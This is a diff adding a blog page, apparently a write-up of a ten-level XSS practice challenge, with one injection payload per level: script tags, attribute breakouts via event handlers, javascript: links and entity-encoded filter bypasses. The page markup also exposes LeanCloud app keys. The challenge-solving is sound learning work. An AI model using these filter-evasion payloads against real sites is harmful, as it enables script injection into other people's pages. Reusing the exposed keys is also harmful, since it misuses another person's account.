@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="XSS-challenge-tour"/><link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="http://yoursite.com/2021/02/11/XSS-challenge-tour/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":"app_id:sB2SP6AaImiT4x3A8ms2stxj-gzGzoHsz app_key:69kbIXu3HeNAasY9m6mbX6fa","toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>XSS-challenge-tour - Saltneko</title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Saltneko</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="/link/">
+        <li class="mobile-menu-item">Link
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Saltneko</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/link/">
+            Link
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">XSS-challenge-tour
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-02-11
+        </span><span class="post-category">
+            <a href="/categories/XSS/">XSS</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">#level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">#level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-text">#level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">#level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-text">#level5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level6"><span class="toc-text">#level6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7"><span class="toc-text">#level7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8"><span class="toc-text">#level8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9"><span class="toc-text">#level9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10"><span class="toc-text">#level10</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h3 id="level1"><a href="#level1" class="headerlink" title="#level1"></a>#level1</h3><p><img src="/images/pasted-256.png" alt="upload successful"><br>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="#level2"></a>#level2</h3><p><img src="/images/pasted-257.png" alt="upload successful"><br>payload:<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="#level3"></a>#level3</h3><p><img src="/images/pasted-258.png" alt="upload successful"><br>payload:<code>&#39; onmouseover=&#39;alert(1)</code></p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="#level4"></a>#level4</h3><p><img src="/images/pasted-259.png" alt="upload successful"><br>payload:<code>&quot;onmouseover=&quot;alert(1)</code></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="#level5"></a>#level5</h3><p><img src="/images/pasted-260.png" alt="upload successful"><br>payload:<code>xxx&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;</code></p>
+<h3 id="level6"><a href="#level6" class="headerlink" title="#level6"></a>#level6</h3><p><img src="/images/pasted-261.png" alt="upload successful"><br>payload:<code>111&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="#level7"></a>#level7</h3><p><img src="/images/pasted-263.png" alt="upload successful"><br>payload:<code>xx&quot; oonnmouseover=&quot;alert(1)</code></p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="#level8"></a>#level8</h3><p><img src="/images/pasted-264.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="#level9"></a>#level9</h3><p><img src="/images/pasted-265.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p>
+<h3 id="level10"><a href="#level10" class="headerlink" title="#level10"></a>#level10</h3><p><img src="/images/pasted-266.png" alt="upload successful"><br>payload:<code>?t_sort=&quot; onclick=&quot;alert(1)&quot; type=</code></p>
+
+      </div>
+      
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="next" href="/2021/01/30/Github-wp/">
+        <span class="next-text nav-default">Ctfhub-wp</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div>
+  <div class="comments" id="comments">
+    
+  </div>
+</div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/SaLTNEko" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Salt</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
